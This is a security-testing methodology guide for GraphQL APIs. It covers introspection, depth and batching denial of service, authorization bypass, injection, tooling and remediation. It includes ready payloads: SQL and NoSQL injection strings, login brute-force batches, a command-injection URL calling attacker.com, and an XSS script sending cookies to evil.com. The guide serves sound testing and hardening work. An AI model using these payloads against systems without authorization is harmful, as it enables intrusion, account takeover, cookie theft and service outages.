# GraphQL Security Testing

## Overview
GraphQL APIs introduce unique security challenges due to their flexible query language, single-endpoint architecture, and self-documenting nature. Attackers can abuse introspection to map the entire schema, craft deeply nested or batched queries for denial of service, bypass authorization at the field level, and exploit injection points within resolvers. This skill covers comprehensive testing of GraphQL-specific attack vectors.

## Classification
- **CWE:** CWE-200 (Exposure of Sensitive Information), CWE-284 (Improper Access Control), CWE-400 (Uncontrolled Resource Consumption), CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **OWASP:** API3:2023 - Broken Object Property Level Authorization, API4:2023 - Unrestricted Resource Consumption, API8:2023 - Security Misconfiguration
- **CVSS Base:** 5.3 - 9.1 (Medium to Critical)
- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

## Detection Methodology

### 1. Endpoint Discovery
Locate the GraphQL endpoint:
```
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql
/graphql/console
/graphql/v1
/playground
/explorer
```
Test with a simple query to confirm:
```bash
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'
```

### 2. Introspection Attacks
Extract the full schema when introspection is enabled:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```
If introspection is disabled, test bypass variations:
```graphql
# Whitespace and casing variations
{ __Schema { types { name } } }

# Using GET with query parameter
GET /graphql?query={__schema{types{name}}}

# POST with different content types
Content-Type: application/x-www-form-urlencoded
query={__schema{types{name}}}
```

### 3. Field Suggestion Abuse
When introspection is disabled, exploit field suggestion error messages:
```graphql
# Send misspelled field names
{ usr { id name } }
# Error: "Did you mean 'user'?"

# Iteratively discover fields
{ user { pasword } }
# Error: "Did you mean 'password' or 'passwordHash'?"
```
Use tools like `clairvoyance` to automate schema recovery from suggestions.

### 4. Query Depth Attacks (Nested Query DoS)
Craft deeply nested queries to exhaust server resources:
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                id name email
              }
            }
          }
        }
      }
    }
  }
}
```
Test progressively deeper nesting to find the depth limit (or lack thereof).

### 5. Query Complexity / Width Attacks
Request many fields or aliases to cause resource exhaustion:
```graphql
{
  a1: users(first: 1000) { id name email orders { id total items { id name } } }
  a2: users(first: 1000) { id name email orders { id total items { id name } } }
  a3: users(first: 1000) { id name email orders { id total items { id name } } }
  # ... repeat 100+ times
}
```

### 6. Batching Attacks
Send multiple operations in a single request for brute force or DoS:
```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"password1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"password3\") { token } }"}
]
```
Also test alias-based batching within a single query:
```graphql
mutation {
  attempt1: login(user: "admin", pass: "pass1") { token }
  attempt2: login(user: "admin", pass: "pass2") { token }
  attempt3: login(user: "admin", pass: "pass3") { token }
}
```

### 7. Authorization Bypass
```graphql
# Access fields the current role should not see
{ user(id: 1) { id name email ssn internalNotes adminFlag } }

# Access mutations without proper authorization
mutation { deleteUser(id: 1002) { success } }

# Nested authorization bypass
{ publicPost(id: 1) { author { email privateMessages { content } } } }

# Direct node access bypassing business logic
{ node(id: "Base64EncodedID") { ... on User { email passwordResetToken } } }
```

### 8. Injection in GraphQL
```graphql
# SQL injection via resolver arguments
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection
{ user(filter: "{\"$gt\": \"\"}") { id email } }

# OS command injection in mutation inputs
mutation { importData(url: "http://attacker.com/$(whoami)") { status } }

# Stored XSS via mutations
mutation { updateProfile(bio: "<script>fetch('http://evil.com/'+document.cookie)</script>") { id } }
```

### 9. Subscription Abuse
```graphql
# Subscribe to events without authorization
subscription { newMessage(channel: "admin-internal") { content sender } }

# Subscribe to all data changes
subscription { onAnyChange { type entity data } }
```

## Tool Usage

### InQL (Burp Extension)
```
1. Install InQL from BApp Store
2. Send introspection query to target
3. InQL generates query templates for all types
4. Use Scanner tab to identify security issues
5. Export generated queries for manual testing
```

### graphw00f (Fingerprinting)
```bash
# Identify the GraphQL engine
python3 graphw00f.py -t http://target.com/graphql
# Detects: Apollo, Hasura, graphql-java, Sangria, etc.
```

### clairvoyance (Schema Recovery)
```bash
# Recover schema when introspection is disabled
python3 clairvoyance.py -u http://target.com/graphql -o schema.json -w wordlist.txt
```

### BatchQL
```bash
# Test for batching vulnerabilities
python3 batch.py -e http://target.com/graphql -q 'mutation{login(u:"admin",p:"§PASS§"){token}}'
```

### CrackQL
```bash
# Alias-based brute force
crackql -t http://target.com/graphql -q login.graphql -i passwords.csv
```

### graphql-voyager
```
# Visualize GraphQL schema relationships
# Paste introspection results into voyager for interactive exploration
```

## Remediation
1. **Disable introspection in production** -- only enable in development environments
2. **Query depth limiting** -- enforce maximum depth (typically 7-10 levels) via middleware
3. **Query complexity analysis** -- assign cost values to fields and reject queries exceeding a threshold
4. **Disable query batching** -- or limit batch size to prevent brute force
5. **Field-level authorization** -- enforce access control in every resolver, not just at the query level
6. **Input validation** -- validate and sanitize all resolver arguments against injection
7. **Rate limiting** -- apply per-operation rate limits, not just per-request
8. **Timeout enforcement** -- set execution time limits on queries
9. **Persisted queries** -- allow only pre-approved query hashes in production
10. **Suppress field suggestions** -- configure the engine to not reveal field names in errors

## Evidence Collection
- Full or partial schema obtained via introspection or suggestion abuse
- Query depth test results showing maximum accepted depth and server behavior
- Batching test results demonstrating brute force capability
- Authorization bypass examples with request/response pairs
- Injection payloads that succeeded within resolver arguments
- Server resource consumption metrics during DoS queries (response times, CPU impact)
- GraphQL engine fingerprint and version information
